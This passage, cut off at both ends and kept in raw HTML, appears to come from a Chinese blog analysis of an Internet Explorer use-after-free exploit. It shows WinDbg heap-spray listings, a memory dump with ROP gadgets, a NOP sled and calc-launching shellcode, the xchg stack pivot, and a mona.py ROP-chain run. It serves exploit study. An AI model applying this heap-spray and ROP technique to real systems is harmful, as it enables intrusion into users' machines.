VirtualAlloc)</span><br><span class=\"line\">        07050018 1fffc fffc  [00]   07050020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07150018 1fffc fffc  [00]   07150020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07250018 1fffc fffc  [00]   07250020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07350018 1fffc fffc  [00]   07350020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07450018 1fffc fffc  [00]   07450020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07550018 1fffc fffc  [00]   07550020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07650018 1fffc fffc  [00]   07650020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07750018 1fffc fffc  [00]   07750020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07850018 1fffc fffc  [00]   07850020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07950018 1fffc fffc  [00]   07950020    fffe0 - (busy VirtualAlloc) # 查看这一块</span><br><span class=\"line\">        07a50018 1fffc fffc  [00]   07a50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07b50018 1fffc fffc  [00]   07b50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07c50018 1fffc fffc  [00]   07c50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07d50018 1fffc fffc  [00]   07d50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07e50018 1fffc fffc  [00]   07e50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07f50018 1fffc fffc  [00]   07f50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08050018 1fffc fffc  [00]   08050020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08150018 1fffc fffc  [00]   08150020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08250018 1fffc fffc  [00]   08250020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08350018 1fffc fffc  [00]   08350020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08450018 1fffc fffc  [00]   08450020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08550018 1fffc fffc  [00]   08550020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08650018 1fffc fffc  [00]   08650020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08750018 1fffc fffc  [00]   08750020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08850018 1fffc fffc  [00]   08850020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08950018 1fffc fffc  [00]   08950020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08a50018 1fffc fffc  [00]   08a50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08b50018 1fffc fffc  [00]   08b50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08c50018 1fffc fffc  [00]   08c50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08d50018 1fffc fffc  [00]   08d50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08e50018 1fffc fffc  [00]   08e50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08f50018 1fffc fffc  [00]   08f50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09050018 1fffc fffc  [00]   09050020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09150018 1fffc fffc  [00]   09150020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09250018 1fffc fffc  [00]   09250020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09350018 1fffc fffc  [00]   09350020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09450018 1fffc fffc  [00]   09450020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09550018 1fffc fffc  [00]   09550020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09650018 1fffc fffc  [00]   09650020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09750018 1fffc fffc  [00]   09750020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09850018 1fffc fffc  [00]   09850020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09950018 1fffc fffc  [00]   09950020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09a50018 1fffc fffc  [00]   09a50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09b50018 1fffc fffc  [00]   09b50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09c50018 1fffc fffc  [00]   09c50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09d50018 1fffc fffc  [00]   09d50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09e50018 1fffc fffc  [00]   09e50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09f50018 1fffc fffc  [00]   09f50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0a050018 1fffc fffc  [00]   0a050020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0a150018 1fffc fffc  [00]   0a150020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0a250018 1fffc fffc  [00]   0a250020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0a350018 1fffc fffc  [00]   0a350020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0a450018 1fffc fffc  [00]   0a450020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0a550018 1fffc fffc  [00]   0a550020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0a650018 1fffc fffc  [00]   0a650020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0a750018 1fffc fffc  [00]   0a750020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0a850018 1fffc fffc  [00]   0a850020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0a950018 1fffc fffc  [00]   0a950020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0aa50018 1fffc fffc  [00]   0aa50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0ab50018 1fffc fffc  [00]   0ab50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0ac50018 1fffc fffc  [00]   0ac50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0ad50018 1fffc fffc  [00]   0ad50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0ae50018 1fffc fffc  [00]   0ae50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0af50018 1fffc fffc  [00]   0af50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0b050018 1fffc fffc  [00]   0b050020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0b150018 1fffc fffc  [00]   0b150020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0b250018 1fffc fffc  [00]   0b250020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0b350018 1fffc fffc  [00]   0b350020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0b450018 1fffc fffc  [00]   0b450020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0b550018 1fffc fffc  [00]   0b550020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0b650018 1fffc fffc  [00]   0b650020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0b750018 1fffc fffc  [00]   0b750020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0b850018 1fffc fffc  [00]   0b850020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0b950018 1fffc fffc  [00]   0b950020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0ba50018 1fffc fffc  [00]   0ba50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0bb50018 1fffc fffc  [00]   0bb50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0bc50018 1fffc fffc  [00]   0bc50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0bd50018 1fffc fffc  [00]   0bd50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0be50018 1fffc fffc  [00]   0be50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0bf50018 1fffc fffc  [00]   0bf50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">    _HEAP @ 10000</span><br><span class=\"line\">    _HEAP @ 2f0000</span><br><span class=\"line\">    _HEAP @ 1240000</span><br><span class=\"line\">    _HEAP @ 24a0000</span><br><span class=\"line\">    _HEAP @ 2cc0000</span><br></pre></td></tr></table></figure>\n<p>重点关注0x7950018这一块，可以看到从0x7950024开始是0x1c字节的padding，然后就是shellcode，也就是说0x79500040是一个可用的gadget地址。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; dd 07950018 L 100</span><br><span class=\"line\">07950018  2498ef9a 04000000 000fffda 41414141</span><br><span class=\"line\">07950028  42424242 43434343 41414141 42424242</span><br><span class=\"line\">07950038  43434343 41414141 6b661041 6b662c60</span><br><span class=\"line\">07950048  6b67b43b 6b662c60 6b662c60 6b663059</span><br><span class=\"line\">07950058  00001024 6b6fced0 00000040 6b662fa9</span><br><span class=\"line\">07950068  6bb9fe20 6b6630ae 6b661041 6b662f0b</span><br><span class=\"line\">07950078  6b66f920 6b674ef7 6b661348 6b6cf0bb</span><br><span class=\"line\">07950088  6b6994a1 6b6c3d7e 90909090 90909090</span><br><span class=\"line\">07950098  90909090 0089e8fc 89600000 64d231e5</span><br><span class=\"line\">079500a8  8b30528b 528b0c52 28728b14 264ab70f</span><br><span class=\"line\">079500b8  c031ff31 7c613cac c1202c02 c7010dcf</span><br><span class=\"line\">079500c8  5752f0e2 8b10528b d0013c42 8578408b</span><br><span class=\"line\">079500d8  014a74c0 488b50d0 20588b18 3ce3d301</span><br><span class=\"line\">079500e8  8b348b49 ff31d601 c1acc031 c7010dcf</span><br><span class=\"line\">079500f8  f475e038 3bf87d03 e275247d 24588b58</span><br><span class=\"line\">07950108  8b66d301 588b4b0c 8bd3011c d0018b04</span><br><span class=\"line\">07950118  24244489 59615b5b e0ff515a 8b5a5f58</span><br><span class=\"line\">07950128  5d86eb12 858d016a 000000b9 8b316850</span><br><span class=\"line\">07950138  d5ff876f a2b5f0bb 95a66856 d5ff9dbd</span><br><span class=\"line\">07950148  0a7c063c 75e0fb80 1347bb05 006a6f72</span><br><span class=\"line\">07950158  63d5ff53 2e636c61 00657865 90909090</span><br><span class=\"line\">07950168  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950178  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950188  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950198  90909090 90909090 90909090 90909090</span><br><span class=\"line\">079501a8  90909090 90909090 90909090 90909090</span><br><span class=\"line\">079501b8  90909090 90909090 90909090 90909090</span><br><span class=\"line\">079501c8  90909090 90909090 90909090 90909090</span><br><span class=\"line\">079501d8  90909090 90909090 90909090 90909090</span><br><span class=\"line\">079501e8  90909090 90909090 90909090 90909090</span><br><span class=\"line\">079501f8  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950208  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950218  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950228  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950238  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950248  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950258  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950268  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950278  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950288  90909090 90909090 90909090 90909090</span><br></pre></td></tr></table></figure>\n<p>同理，可用地址还有0810，0fe0，17b0，1f80……，每次增加0x7d0，这是因为一个最小单元的块是1000*2（0x7d0）。所以exp中的0x6da0也符合条件，验证如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; dd 079f6da0</span><br><span class=\"line\">079f6da0  6b661041 6b662c60 6b67b43b 6b662c60</span><br><span class=\"line\">079f6db0  6b662c60 6b663059 00001024 6b6fced0</span><br><span class=\"line\">079f6dc0  00000040 6b662fa9 6bb9fe20 6b6630ae</span><br><span class=\"line\">079f6dd0  6b661041 6b662f0b 6b66f920 6b674ef7</span><br><span class=\"line\">079f6de0  6b661348 6b6cf0bb 6b6994a1 6b6c3d7e</span><br><span class=\"line\">079f6df0  90909090 90909090 90909090 0089e8fc</span><br><span class=\"line\">079f6e00  89600000 64d231e5 8b30528b 528b0c52</span><br><span class=\"line\">079f6e10  28728b14 264ab70f c031ff31 7c613cac</span><br></pre></td></tr></table></figure>\n<p>至此，我们终于理清了堆喷的思路，就是整齐的摆放堆块，使得gadget地址位于可预测的位置，在Glibc pwn中也有类似细微的操作。</p>\n<p><strong>不过还需要提一句的是，CButtonLayout对象的vftable是如何控制调用流程的呢？即，这个虚函数是在什么时候被怎样调用的？</strong></p>\n<p>在xchg指令处下断点：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:013&gt; bp 0x1B43B+686a0000 </span><br><span class=\"line\">0:013&gt; g</span><br><span class=\"line\">ModLoad: 6c4f0000 6c5a2000   C:\\Windows\\System32\\jscript.dll</span><br><span class=\"line\">Breakpoint 0 hit</span><br><span class=\"line\">eax=079f6da0 ebx=01000000 ecx=034cd3b0 edx=00000041 esi=024ccf00 edi=034cea40</span><br><span class=\"line\">eip=686bb43b esp=024ccd38 ebp=024ccd70 iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!CTreeNode::GetParentWidth+0x9c:</span><br><span class=\"line\">686bb43b 94              xchg    eax,esp</span><br><span class=\"line\">0:005&gt; dd 034cd3b0 </span><br><span class=\"line\">034cd3b0  079f6da0 0047e9e0 034cea40 687f8690</span><br><span class=\"line\">034cd3c0  79f6da08 00000000 01080809 ffffffff</span><br><span class=\"line\">034cd3d0  00000000 00000000 00000000 ffffffff</span><br><span class=\"line\">034cd3e0  00000080 ffffffff 00000000 00000000</span><br><span class=\"line\">034cd3f0  00000000 00000000 00000000 00000024</span><br><span class=\"line\">034cd400  00000020 00000000 00000000 00000000</span><br><span class=\"line\">034cd410  00000000 00000000 00000000 00000000</span><br><span class=\"line\">034cd420  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure>\n<p><strong>此时eax实际上为要栈迁移的地址，而这个地址来源于ecx，应该有<code>mov eax, [ecx]</code>，所以之前的call [eax+8]实际上就是直接跳转到<code>xchg</code>这条指令，然后将esp修改为第一条gadget的地址（retn），然后再通过第二条gadget pop;ret，将<code>xchg</code>指令过掉，从而执行下面的<code>VirtualProtect</code>ROP。</strong></p>\n<h4 id=\"Rop链\"><a href=\"#Rop链\" class=\"headerlink\" title=\"Rop链\"></a>Rop链</h4><p>现在我们已经将EIP劫持到了可控位置，下一步就是写Rop链了。</p>\n<p>首先使用mona的rop方法试一下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">!py mona.py rop -m mshtml.dll -cpb \\x00</span><br></pre></td></tr></table></figure>\n<p>确实手动生成了rop链，但是耗时较长。</p>\n<p>输出文件有stackpivot.txt, rop.txt, rop_suggestions.txt和rop_chains.txt。最终的结果是在rop_chains.txt中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-----------------------------------------------------------------------------------------------------------------------------------------</span><br><span class=\"line\"> Module info :</span><br><span class=\"line\">-----------------------------------------------------------------------------------------------------------------------------------------</span><br><span class=\"line\"> Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename &amp; Path</span><br><span class=\"line\">-----------------------------------------------------------------------------------------------------------------------------------------</span><br><span class=\"line\"> 0x72a50000 | 0x734d0000 | 0x00a80000 | False  | True    | True  |  True    | True   | 8.0.7601.17514 [IEFRAME.dll] (C:\\Windows\\system32\\IEFRAME.dll)</span><br><span class=\"line\"> 0x74670000 | 0x746a9000 | 0x00039000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [MMDevAPI.DLL] (C:\\Windows\\system32\\MMDevAPI.DLL)</span><br><span class=\"line\"> 0x76300000 | 0x76436000 | 0x00136000 | False  | True    | True  |  True    | True   | 8.0.7601.17514 [urlmon.dll] (C:\\Windows\\system32\\urlmon.dll)</span><br><span class=\"line\"> 0x74660000 | 0x74667000 | 0x00007000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [AVRT.dll] (C:\\Windows\\system32\\AVRT.dll)</span><br><span class=\"line\"> 0x6b2d0000 | 0x6b887000 | 0x005b7000 | False  | True    | True  |  True    | True   | 8.0.7601.17514 [mshtml.dll] (C:\\Windows\\System32\\mshtml.dll)</span><br><span class=\"line\"> 0x70790000 | 0x707c0000 | 0x00030000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [wdmaud.drv] (C:\\Windows\\system32\\wdmaud.drv)</span><br><span class=\"line\"> 0x75c00000 | 0x75c4c000 | 0x0004c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [apphelp.dll] (C:\\Windows\\system32\\apphelp.dll)</span><br><span class=\"line\"> 0x75ee0000 | 0x75ffd000 | 0x0011d000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [CRYPT32.dll] (C:\\Windows\\system32\\CRYPT32.dll)</span><br><span class=\"line\"> 0x75d70000 | 0x75d7c000 | 0x0000c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [MSASN1.dll] (C:\\Windows\\system32\\MSASN1.dll)</span><br><span class=\"line\"> 0x76000000 | 0x760d4000 | 0x000d4000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [kernel32.dll] (C:\\Windows\\system32\\kernel32.dll)</span><br><span class=\"line\"> 0x773f0000 | 0x7749c000 | 0x000ac000 | False  | True    | True  |  True    | True   | 7.0.7600.16385 [msvcrt.dll] (C:\\Windows\\system32\\msvcrt.dll)</span><br><span class=\"line\"> 0x75c50000 | 0x75c5c000 | 0x0000c000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPTBASE.dll] (C:\\Windows\\system32\\CRYPTBASE.dll)</span><br><span class=\"line\"> 0x705f0000 | 0x70626000 | 0x00036000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [AUDIOSES.DLL] (C:\\Windows\\system32\\AUDIOSES.DLL)</span><br><span class=\"line\"> 0x746b0000 | 0x746c3000 | 0x00013000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [dwmapi.dll] (C:\\Windows\\system32\\dwmapi.dll)</span><br><span class=\"line\"> 0x77bb0000 | 0x77cec000 | 0x0013c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [ntdll.dll] (C:\\Windows\\SYSTEM32\\ntdll.dll)</span><br><span class=\"line\"> 0x6d8d0000 | 0x6d8fb000 | 0x0002b000 | False  | True    | True  |  True    | False  | 8.0.7601.17514 [ieproxy.dll] (C:\\Program Files\\Internet Explorer\\ieproxy.dll)</span><br><span class=\"line\"> 0x775a0000 | 0x775b9000 | 0x00019000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [sechost.dll] (C:\\Windows\\SYSTEM32\\sechost.dll)</span><br><span class=\"line\"> 0x76180000 | 0x76185000 | 0x00005000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [PSAPI.DLL] (C:\\Windows\\system32\\PSAPI.DLL)</span><br><span class=\"line\"> 0x77cf0000 | 0x77cfa000 | 0x0000a000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [LPK.dll] (C:\\Windows\\system32\\LPK.dll)</span><br><span class=\"line\"> 0x77930000 | 0x77b2b000 | 0x001fb000 | False  | True    | True  |  True    | True   | 8.0.7601.17514 [iertutil.dll] (C:\\Windows\\system32\\iertutil.dll)</span><br><span class=\"line\"> 0x70750000 | 0x70754000 | 0x00004000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [ksuser.dll] (C:\\Windows\\system32\\ksuser.dll)</span><br><span class=\"line\"> 0x775c0000 | 0x7765d000 | 0x0009d000 | False  | True    | True  |  True    | True   | 1.626.7601.17514 [USP10.dll] (C:\\Windows\\system32\\USP10.dll)</span><br><span class=\"line\"> 0x771c0000 | 0x772b5000 | 0x000f5000 | False  | True    | True  |  True    | True   | 8.0.7601.17514 [WININET.dll] (C:\\Windows\\system32\\WININET.dll)</span><br><span class=\"line\"> 0x73ec0000 | 0x73ec7000 | 0x00007000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [WINNSI.DLL] (C:\\Windows\\system32\\WINNSI.DLL)</span><br><span class=\"line\"> 0x75bd0000 | 0x75beb000 | 0x0001b000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SspiCli.dll] (C:\\Windows\\system32\\SspiCli.dll)</span><br><span class=\"line\"> 0x73ef0000 | 0x73f0c000 | 0x0001c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [iphlpapi.DLL] (C:\\Windows\\system32\\iphlpapi.DLL)</span><br><span class=\"line\"> 0x75ec0000 | 0x75ed2000 | 0x00012000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [DEVOBJ.dll] (C:\\Windows\\system32\\DEVOBJ.dll)</span><br><span class=\"line\"> 0x761a0000 | 0x762fc000 | 0x0015c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [ole32.dll] (C:\\Windows\\system32\\ole32.dll)</span><br><span class=\"line\"> 0x76460000 | 0x764b7000 | 0x00057000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SHLWAPI.dll] (C:\\Windows\\system32\\SHLWAPI.dll)</span><br><span class=\"line\"> 0x75780000 | 0x75796000 | 0x00016000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPTSP.dll] (C:\\Windows\\system32\\CRYPTSP.dll)</span><br><span class=\"line\"> 0x774d0000 | 